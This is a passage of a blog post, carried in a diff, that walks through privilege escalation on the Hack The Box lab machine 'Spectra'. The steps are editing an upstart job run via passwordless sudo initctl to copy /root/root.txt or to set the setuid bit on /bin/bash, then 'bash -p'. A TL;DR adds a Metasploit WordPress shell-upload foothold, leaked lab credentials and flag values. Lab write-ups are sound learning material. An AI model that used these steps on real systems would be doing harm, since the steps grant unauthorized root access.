+</code></pre><p>We&rsquo;re simply catting the contents of the <code>root.txt</code> to a file in <code>katie</code>&rsquo;s home directory and then
+making that new file world readable. The second part is necessary because we want to make sure our
+new file, which will be owned by <code>root</code>, is world readable so that <code>katie</code> can access it. Here&rsquo;s
+what our <code>test.conf</code> should look like:</p>
+<pre><code>katie@spectra /etc/init $ cat test.conf
+description &quot;Test node.js server&quot;
+author      &quot;katie&quot;
+
+start on filesystem or runlevel [2345]
+stop on shutdown
+
+script
+   cat /root/root.txt &gt;&gt; /home/katie/flag.txt
+   chmod 777 /home/katie/flag.txt
+
+end script
+
+pre-start script
+    echo &quot;[`date`] Node Test Starting&quot; &gt;&gt; /var/log/nodetest.log
+end script
+
+pre-stop script
+    rm /var/run/nodetest.pid
+    echo &quot;[`date`] Node Test Stopping&quot; &gt;&gt; /var/log/nodetest.log
+end script
+
+</code></pre><p>The only thing left to do now is run the test job and reap the fruit of our efforts.</p>
+<pre><code>katie@spectra /etc/init $ sudo /sbin/initctl start test
+test start/running, process 9474
+
+katie@spectra /etc/init $ cat /home/katie/flag.txt
+d44519713b889d5e1f9e536d0c6df2fc
+</code></pre><p>And there it is! the root flag! As stated above, this is good enough for our use case. But say we
+wish to have root access to the machine, not just dump the contents of a single file. Let&rsquo;s find out
+how we can achieve that in the next section.</p>
+<h3 id="persistent-solution">Persistent Solution<a href="#persistent-solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The persistent solution is similar to the <a href="#flag-solution">flag solution</a> but we&rsquo;re going to be
+replacing the script with the following command.</p>
+<pre><code>chmod +s /bin/bash
+</code></pre><p>What we&rsquo;re actually doing here is setting the &ldquo;s&rdquo; flag on the <code>/bin/bash</code> file. What this does is
+make bash set the user and group IDs to those of the owner of the file when executed. In the case of
+<code>/bin/bash</code>, the user and group are <code>root</code> and <code>root</code>, respectively.</p>
+<p>We can now invoke <code>bash</code> as the <code>root</code> user becau the <code>SETUID</code> flag is set on <code>/bin/bash</code> file.
+This all looks good but it is still not sufficient. To understand why, let&rsquo;s read an excerpt of the
+<a href="http://www.gnu.org/software/bash/manual/bash.html#Bash-Startup-Files"><code>bash</code> documentation</a>.</p>
+<blockquote>
+<p>Invoked with unequal effective and real UID/GIDs</p>
+<p>If Bash is started with the effective user (group) id not equal to the real user (group) id, and
+the -p option is not supplied, no startup files are read, shell functions are not inherited from
+the environment, the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the
+environment, are ignored, and the effective user id is set to the real user id. If the -p option
+is supplied at invocation, the startup behavior is the same, but the effective user id is not
+reset.</p>
+</blockquote>
+<p>What this means is that if we want to successfully inherit the root uid and gid, we will need
+to invoke <code>bash</code> with the <code>-p</code> option.</p>
+<pre><code>katie@spectra /etc/init $ /bin/bash -p
+bash-4.3# whoami
+root
+
+bash-4.3# cat /root/root.txt
+d44519713b889d5e1f9e536d0c6df2fc
+</code></pre><p>And there you have it, the root flag! We were able to get <code>root</code> privileges simply because <code>sudo</code>
+was not requiring a password from the <code>katie</code> user to run the <code>/sbin/initctl</code>. We leveraged that to
+modify an already existing job (on which <code>katie</code> had write access to) to run some commands to either
+make a <code>katie</code> readable copy of the <code>root.txt</code> file, or motifying the <code>SETUID</code> flag on the
+<code>/bin/bash</code> file to allow us to run a <code>bash</code> shell with root privileges. Again, no hacking magic,
+simply exploitation of a misconfigured system.</p>
+<h2 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><code>Spectra</code> was a great box in the sense that it was relatively accessible and easy to do. It also
+gave us the opportunity to learn about Gobuster, the Metasploit framework, <code>sudo</code> configurations,
+and a bit more about <code>bash</code>. We also had the opportunity to build our own exploit to get that
+initial foothold if DIY is our thing.</p>
+<p>From there, the rest of the work involved for this machine is primarily enumeration such as finding
+the DB credentials in the <code>/testing</code> directory, trial and error such as guessing the <code>administrator</code>
+user name, and exploiting misconfigurations across the system. <code>Spectra</code>highlights well how a series
+of small misconfigurations can snowball into full-on privilege escalation.</p>
+<p>That&rsquo;s all for now then, I hope you enjoyed reading about <code>spectra</code> as much as I enjoyed writing
+about it. Until next time, happy hacking!</p>
+<h2 id="tldr">TL;DR<a href="#tldr" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="foothold-1">Foothold<a href="#foothold-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ol>
+<li>Add <code>10.10.10.229 spectra.htb</code> to your hosts file.</li>
+<li>Surf to <code>http://spectra.htb/testing/wp-config.php.save</code> and use the &ldquo;view source&rdquo; feature of your
+browser to pick up the <code>DB_PASSWORD</code>: <code>devteam01</code>.</li>
+<li>Use the <code>exploit/unix/webapp/wp_admin_shell_upload</code> Metasploit module and configure the
+<code>USERNAME</code> to <code>administrator</code>, the <code>PASSWORD</code> to <code>devteam01</code>, and the <code>TARGETURI</code> to <code>/main</code>.</li>
+<li>Get a low privilege <code>nginx</code> shell.</li>
+</ol>
+<h3 id="user-1">User<a href="#user-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ol>
+<li>The user we&rsquo;re after is <code>katie</code>. Her password is saved in <code>/etc/autologin/passwd</code>:
+<code>SummerHereWeCome!!</code> for use with an auto login feature.</li>
+<li>SSH login using these credentials: <code>ssh katie@10.10.10.229</code>.</li>
+<li>Run <code>cat /home/katie/user.txt</code>: <code>e89d27fe195e9114ffa72ba8913a6130</code>.</li>
+</ol>
+<h3 id="root-1">Root<a href="#root-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ol>
+<li>Modify the <code>/etc/init/test.conf</code> file to add <code>chmod +s /bin/bash</code> in the script section.</li>
+<li>Run <code>sudo /sbin/initctl start test</code>.</li>
+<li>Run <code>/bin/bash -p</code>.</li>
+<li>Run <code>cat /root/root.txt</code>: <code>d44519713b889d5e1f9e536d0c6df2fc</code>.</li>
+</ol>
+
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>Reda Baydoun</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://theredbay.net/assets/main.js"></script>
+<script src="https://theredbay.net/assets/prism.js"></script>
+
+
+  <script src="https://theredbay.net/assets/languageSelector.js"></script>
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
